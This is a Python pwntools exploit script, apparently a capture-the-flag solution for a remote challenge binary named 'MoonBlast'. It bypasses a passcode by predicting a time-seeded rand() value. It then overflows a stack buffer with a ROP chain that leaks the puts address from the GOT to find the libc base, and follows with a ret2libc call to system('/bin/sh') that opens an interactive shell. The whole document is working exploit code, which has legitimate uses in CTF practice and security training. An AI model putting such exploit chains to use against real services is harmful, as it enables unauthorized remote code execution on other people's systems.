from pwn import *
from ctypes import *

os.system('./rand > rand.txt')
rand_int = 0
with open("rand.txt") as f:
    for num in f:
        rand_int = eval(num.strip())

elf=ELF('./MoonBlast')
# r=process('./MoonBlast')
r=remote('ash-chal.firebird.sh',36031)
# libc1=ELF('./libc6_2.27-3ubuntu1.5_amd64.so')
libc1=ELF('./libc.so.6')
# libc1 = ELF("./libc/libc6_2.35-0ubuntu1_amd64.so") # test

context.log_level='debug'
context.terminal=['tmux','splitw','-h']
context.arch='amd64'

# libc = CDLL('./libc6_2.27-3ubuntu1.5_amd64.so')
libc = CDLL('./libc.so.6')
time = libc.time(0)
print(hex(time))
libc.srand(time)
rand = libc.rand()
print(hex(rand))

r.recvuntil(b'Please enter the passcode: ')
r.sendline(bytes(str(rand_int),encoding='utf8'))
pop_rdi = 0x0000000000400a13

r.recvuntil(b'Please enter your command: ')
payload = b'a'*0x78
payload += flat(pop_rdi,elf.got['puts'],elf.plt['puts'],elf.sym['command'])
r.sendline(payload)

r.recvuntil(b'Command received!\n')
getchar_addr = u64(r.recv(6).ljust(8,b'\x00'))
print("getchar_addr: ", hex(getchar_addr))
libc_base = getchar_addr - libc1.symbols['puts']
print("libc_base: ", hex(libc_base))

bin_sh_addr = libc_base + next(libc1.search(b'/bin/sh'))
system_addr = libc_base + libc1.symbols['system']

r.recvuntil(b'Please enter your command: ')
payload = b'a'*0x78
payload += flat(pop_rdi,bin_sh_addr,0x00000000004006ae,system_addr)
r.sendline(payload)

# gdb.attach(r)

r.interactive()